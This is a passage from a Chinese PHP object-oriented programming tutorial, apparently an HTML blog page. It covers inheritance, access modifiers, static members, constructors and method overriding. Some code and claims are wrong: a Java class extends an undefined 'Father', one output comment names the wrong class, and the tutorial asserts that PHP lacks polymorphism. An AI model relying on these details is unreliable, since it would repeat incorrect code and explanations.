class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//父类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Human</span></span>&#123;&#125;<span class="comment">//人类</span></span><br><span class="line"><span class="comment">//子类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Man</span> <span class="keyword">extends</span> <span class="title">Human</span></span>&#123;&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Woman</span> <span class="keyword">extends</span> <span class="title">Human</span></span>&#123;&#125;<span class="comment">//继承Human类</span></span><br></pre></td></tr></table></figure><ol start="3"><li>继承效果：子类可以不用自己去实现某些功能，而可以直接访问父类中已经存在的成员</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//父类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Human</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">eat</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;吃饭&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//子类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Man</span> <span class="keyword">extends</span> <span class="title">Human</span></span>&#123;&#125;<span class="comment">//子类为空类：没有类成员</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//实例化子类对象</span></span><br><span class="line"><span class="variable">$m</span> = <span class="keyword">new</span> Man();</span><br><span class="line"><span class="variable">$m</span>-&gt;eat();<span class="comment">//输出吃饭</span></span><br></pre></td></tr></table></figure><blockquote><p><strong>总结</strong></p></blockquote><ol><li>继承extends是面向对象思想中实现代码重复利用的重要特性</li><li>继承是指子类可以直接访问父类中已经存在的成员</li><li>继承可以节省代码工作，同时允许子类中进行扩展，即在子类中增加必要的父类不存在的功能</li></ol><hr><h3 id="3-多态【了解】"><a href="#3-多态【了解】" class="headerlink" title="3. 多态【了解】"></a><strong>3. 多态【了解】</strong></h3><blockquote><p><strong>定义</strong>：多态，是指在发生类的继承的情况下，同时出现方法的重写（override），即子类拥有与父类同名的方法。然后在实例化对象的时候让父类对象指向子类对象（强制类型，PHP不支持），父类对象表现的子类对象的特点。</p></blockquote><ol><li>多态需要强类型语言，以Java为例</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//父类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Animal</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">show</span><span class="params">()</span></span>&#123;</span><br><span class="line">         System.out.println(<span class="string">&quot;Animal&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//子类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Dog</span> <span class="keyword">extends</span> <span class="title">Father</span></span>&#123;</span><br><span class="line">    <span class="comment">//重写show方法</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">show</span><span class="params">()</span></span>&#123;</span><br><span class="line">         System.out.println(<span class="string">&quot;Dog&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//实例化：Java是强类型，必须指定保存数据的变量的类型</span></span><br><span class="line">Animal a = <span class="keyword">new</span> Dog(); <span class="comment">//父类对象指向子类对象空间</span></span><br><span class="line">a.show();<span class="comment">//打印Dog，父类对象调用的是子类方法</span></span><br></pre></td></tr></table></figure><ol start="2"><li>PHP是弱类型语言，所以不存在变量的强制类型，因此PHP不支持多态。</li></ol><blockquote><p><strong>总结</strong></p></blockquote><ol><li>多态的发生必须是有继承关系，并且子类要重写父类方法</li><li>多态是指父类对象拥有子类形态，并且可以表现出子类的特性（调用子类方法）</li><li>PHP是弱类型语言，不支持多态</li></ol><hr><h2 id="二、-PHP继承"><a href="#二、-PHP继承" class="headerlink" title="二、 PHP继承"></a><strong>二、 PHP继承</strong></h2><blockquote><p><strong>思考</strong>：PHP不支持多态，那么PHP中的继承是如何实现，以及到底是个什么效果呢？</p></blockquote><blockquote><p><strong>引入</strong>：PHP是一种由面向过程过度到面向对象的编程语言，所以有一些自己的特性。总体而言，PHP中的继承与大多数面向对象语言一样。</p></blockquote><h3 id="1-继承相关概念和实现【掌握】"><a href="#1-继承相关概念和实现【掌握】" class="headerlink" title="1. 继承相关概念和实现【掌握】"></a><strong>1. 继承相关概念和实现【掌握】</strong></h3><blockquote><p><strong>定义</strong>：继承extends，是指子类通过继承可以访问父类的成员。</p></blockquote><ol><li>继承基本语法：class 子类 extends 父类{}</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//父类（基类）</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Human</span></span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//子类（派生类）</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Man</span> <span class="keyword">extends</span> <span class="title">Human</span></span>&#123;&#125;</span><br></pre></td></tr></table></figure><ol start="2"><li>继承效果：父类被继承的内容，可以通过子类对象进行访问（只能是子类对象）</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//父类（基类）</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Human</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">showName</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">__CLASS__</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//子类（派生类）</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Man</span> <span class="keyword">extends</span> <span class="title">Human</span></span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//实例化子类对象：如果实例化父类对象Human，那么与子类和继承毫无关系</span></span><br><span class="line"><span class="variable">$m</span> = <span class="keyword">new</span> Man();</span><br><span class="line"><span class="variable">$m</span>-&gt;showName();<span class="comment">//访问继承自父类的方法</span></span><br></pre></td></tr></table></figure><ol start="3"><li>继承目标：继承本质是针对同类有包含关系的共性继承，即父类通常是包含子类，子类属于父类。所以在父类中通常定义的是子类共有的一些特性成员，这是开发者默认遵循的规则</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Animal</span></span>&#123;&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Man</span> <span class="keyword">extends</span> <span class="title">Animal</span></span>&#123;&#125;<span class="comment">//不会有语法错误，也可以继承，但是不符合实际</span></span><br></pre></td></tr></table></figure><blockquote><p><strong>总结</strong></p></blockquote><ol><li>继承是利用extends进行子类和父类的关联</li><li>继承利用extends关键字实现</li><li>继承是指实现继承关系后，子类对象可以访问父类被继承的成员。而父类对象不可以访问子类成员（没有关系）</li></ol><hr><blockquote><p><strong>思考</strong>：类中有三大类成员：属性、方法和类常量，还有访问修饰限定符限制，那么继承是子类可以使用父类所有的成员吗？</p></blockquote><blockquote><p><strong>引入</strong>：从理论上讲，继承后子类是可以访问父类的所有成员的，但是实际上父类有一些成员是并不希望被子类访问的，所以继承是有限的。</p></blockquote><h3 id="2-有限继承【掌握】"><a href="#2-有限继承【掌握】" class="headerlink" title="2. 有限继承【掌握】"></a><strong>2. 有限继承【掌握】</strong></h3><blockquote><p><strong>定义</strong>：有限继承，指子类在继承父类的成员的时候，并非继承所有内容，而是继承并使用父类部分内容。</p></blockquote><ol><li>继承内容：PHP中继承是子类继承父类所有的<strong>公有成员</strong>、<strong>受保护成员</strong>和<strong>私有属性</strong>，不能继承父类的私有方法</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//父类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Human</span></span>&#123;</span><br><span class="line">    <span class="keyword">const</span> CALL = <span class="string">&#x27;人&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&#x27;human&#x27;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$age</span> = <span class="string">&#x27;100&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$money</span> = <span class="string">&#x27;100&#x27;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">showName</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;name;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">showAge</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;age;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">showMoney</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;money;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//子类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Man</span> <span class="keyword">extends</span> <span class="title">Human</span></span>&#123;&#125;</span><br><span class="line"><span class="comment">//实例化子类</span></span><br><span class="line"><span class="variable">$m</span> = <span class="keyword">new</span> Man();</span><br><span class="line">var_dump(<span class="variable">$m</span>);<span class="comment">//可以看到父类私有属性</span></span><br><span class="line"><span class="variable">$m</span>-&gt;showName();<span class="comment">//允许直接访问：方法为公有允许类外访问</span></span><br></pre></td></tr></table></figure><ol start="2"><li>受保护继承protected，protected关键字的产生本身就是纯用于继承的，表示允许被子类在子类内部访问的意思，而不允许被外部直接访问。</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//父类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Human</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$age</span> = <span class="string">&#x27;100&#x27;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">showAge</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//子类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Man</span> <span class="keyword">extends</span> <span class="title">Human</span></span>&#123;</span><br><span class="line">    <span class="comment">//在子类内部增加公有访问访问继承自父类的受保护成员</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getProtected</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;age;<span class="comment">//访问父类受保护属性</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;showAge();<span class="comment">//访问父类受保护方法</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//实例化子类对象</span></span><br><span class="line"><span class="variable">$m</span> = <span class="keyword">new</span> Man();</span><br><span class="line"><span class="variable">$m</span>-&gt;getProtected();<span class="comment">//正确输出：说明可以访问</span></span><br></pre></td></tr></table></figure><ol start="3"><li>访问父类私有成员：子类若想访问父类私有成员，那么前提是父类提供了能够访问私有成员的接口：即提供了公有或者受保护的方法给子类访问</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//父类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Human</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$age</span> = <span class="number">100</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$money</span> = <span class="number">100</span>;</span><br><span class="line">    <span class="comment">//提供接口供子类访问：此时通常是受保护的方法，肯定不允许外部直接访问的</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getAge</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//子类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Man</span> <span class="keyword">extends</span> <span class="title">Human</span></span>&#123;</span><br><span class="line">    <span class="comment">//依然需要定义方法来访问继承自父类的受保护的成员</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">showPrivate</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;getAge();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//实例化子类对象</span></span><br><span class="line"><span class="variable">$m</span> = <span class="keyword">new</span> Man();</span><br><span class="line"><span class="variable">$m</span>-&gt;showPrivate();<span class="comment">//输出100，表示正确访问</span></span><br></pre></td></tr></table></figure><p><strong>注意</strong>：虽然子类可以通过以上方式来实现访问父类的私有成员（包括私有方法），但是从设计的意义上讲，私有就是不允许外部访问，所以父类通常不会提供对外的访问接口，以上案例只是为了知识说明。</p><ol start="4"><li>静态成员（类常量）也遵循继承规则（PHP继承本质是对象），只是访问方式是由类进行访问</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Human</span></span>&#123;</span><br><span class="line">    <span class="keyword">const</span> NAME = <span class="string">&#x27;人&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="variable">$count</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="built_in">static</span> <span class="variable">$type</span> = <span class="keyword">array</span>(<span class="string">&#x27;黑&#x27;</span>,<span class="string">&#x27;黄&#x27;</span>,<span class="string">&#x27;白&#x27;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getCount</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="built_in">self</span>::NAME;</span><br><span class="line">        <span class="keyword">echo</span> <span class="built_in">self</span>::<span class="variable">$count</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">protected</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getType</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        print_r(<span class="built_in">self</span>::<span class="variable">$type</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Man</span> <span class="keyword">extends</span> <span class="title">Human</span></span>&#123;</span><br><span class="line">    <span class="comment">//依然需要子类中访问受保护成员</span></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getHuman</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        Human::getType();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> Man::<span class="variable">$count</span>;<span class="comment">//允许直接访问</span></span><br><span class="line">Man::getCount();<span class="comment">//访问父类静态方法</span></span><br><span class="line">Man::getHuman();<span class="comment">//利用子类公有方法访问父类受保护成员</span></span><br></pre></td></tr></table></figure><ol start="5"><li>构造方法和析构方法也可以被子类继承，此时需要注意子类对象实例化时对应的父类构造方法的参数</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//父类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Human</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$money</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$money</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;money = <span class="variable">$money</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;die&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//子类继承</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Man</span> <span class="keyword">extends</span> <span class="title">Human</span></span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//子类实例化：自身是空类，没有指定构造方法</span></span><br><span class="line"><span class="comment">//$m = new Man();//错误：缺少参数，因为会自动调用父类构造方法</span></span><br><span class="line"><span class="variable">$m</span> = <span class="keyword">new</span> Man(<span class="number">100</span>);<span class="comment">//正确</span></span><br></pre></td></tr></table></figure><blockquote><p><strong>总结</strong></p></blockquote><ol><li>继承是有限继承，理论上是用来继承父类允许被继承的部分，即使用public或者protected修饰的成员</li><li>因为对象的属性是保存在对象内存空间，所以父类的私有属性也会继承</li><li>父类私有成员本质不允许被子类访问，但是可以通过父类开放接口实现（一般不会这么操作）</li><li>静态成员也可以遵循继承规则</li><li>构造方法也可以被继承，因此在实例化子类对象的时候，要考虑到父类构造方法所使用到的参数问题</li></ol><hr><blockquote><p><strong>思考</strong>：子类可以从父类进行继承，那如果子类与父类的成员重名了怎么办？</p></blockquote><blockquote><p><strong>引入</strong>：首先，类中定义的成员是允许出现与其他类同名的，但是这个过程如果出现了继承，那么重名就存在<code>重写</code>的问题。</p></blockquote><h3 id="3-重写Override【掌握】"><a href="#3-重写Override【掌握】" class="headerlink" title="3. 重写Override【掌握】"></a><strong>3. 重写Override【掌握】</strong></h3><blockquote><p><strong>定义</strong>：重写，即子类中定义了与父类重名的成员，子类可以重写父类任意类成员，通常重写是用来重写父类的方法，用于扩展或者更改某些业务逻辑。</p></blockquote><ol><li>子类继承父类，同时子类定义与父类同名的类成员</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//父类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Human</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&#x27;Human&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">__CLASS__</span>,<span class="string">&#x27;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//子类继承</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Man</span> <span class="keyword">extends</span> <span class="title">Human</span></span>&#123;</span><br><span class="line">    <span class="comment">//定义同名属性</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&#x27;Man&#x27;</span>;</span><br><span class="line">    <span class="comment">//定义父类同名方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">__CLASS__</span>,<span class="string">&#x27; hello world&lt;br/&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="2"><li>重写父类成员之后，子类只会直接访问子类的成员（覆盖）</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//接上述代码</span></span><br><span class="line"><span class="comment">//实例化子类对象</span></span><br><span class="line"><span class="variable">$m</span> = <span class="keyword">new</span> Man();</span><br><span class="line"><span class="variable">$m</span>-&gt;show();<span class="comment">//输出Human hello world</span></span><br><span class="line">var_dump(<span class="variable">$m</span>);<span class="comment">//只有子类属性$name</span></span><br></pre></td></tr></table></figure><p><strong>注意</strong>：不管是公有和是受保护属性，一旦重写，父类的就会不存在，而私有属性不会被覆盖而丢失</p><ol start="3"><li>重写的要求1：子类重写父类的方法，控制权不能高于父类，即子类可以比父类更开放</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//父类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Human</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">__CLASS__</span>,<span class="string">&#x27;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//子类继承</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Man</span> <span class="keyword">extends</span> <span class="title">Human</span></span>&#123;</span><br><span class="line">    <span class="comment">//重写</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"></span>)</span>&#123;&#125;<span class="comment">//正确</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"></span>)</span>&#123;&#125;<span class="comment">//允许</span></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"></span>)</span>&#123;&#125;<span class="comment">//错误：控制权比父类更严格</span></span><br><span class="line">       </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="4"><li>重写的要求2：PHP中重写要求子类重写父类方法的时候，必须保证与父类同名方法参数一致</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//父类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Human</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">__CLASS__</span>,<span class="string">&#x27;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//子类继承</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Man</span> <span class="keyword">extends</span> <span class="title">Human</span></span>&#123;</span><br><span class="line">    <span class="comment">//重写</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"></span>)</span>&#123;&#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"><span class="variable">$a</span></span>)</span>&#123;&#125;<span class="comment">//错误，与父类同名方法不一致</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>注意</strong>：在方法参数一致不单单要求数量一致，而且数据类型要求也必须相同，但形参名字可以不同；另外，在PHP7以前重写对于参数这块没有要求。</p><ol start="5"><li>重写的要求3：重写针对的是被继承的成员，父类私有方法不会被继承，因此不受要求2规定</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//父类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Human</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">__CLASS__</span>,<span class="string">&#x27;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//子类</span></span><br><span class="line"><span class="class"><span 